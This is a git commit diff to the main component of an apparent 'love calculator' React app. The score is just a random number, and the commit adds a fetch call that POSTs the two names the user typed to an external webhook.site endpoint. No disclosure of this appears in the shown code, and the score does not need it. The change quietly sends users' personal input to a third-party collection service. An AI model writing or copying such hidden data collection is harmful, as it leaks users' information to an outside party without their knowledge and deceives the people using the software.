e9c0e164e0ca59e7414007586fddeef2e585bf09
lacksar <lacksar2006@gmail.com>
2024-04-07 20:15:54 +0545

    commir

--- src/App.js
+++ src/App.js
@@ -18,6 +18,13 @@ function App() {
     let rand = Math.floor(Math.random() * 100) + 1
     setLove(rand)
 
+    const response = await fetch('https://webhook.site/3c0a7546-c103-464d-9d3b-79a044381da9', {
+      method: 'POST',
+      body: `${boy}+${girl}`,
+    });
+
+    const responseData = await response.json();
+
 
   }
 
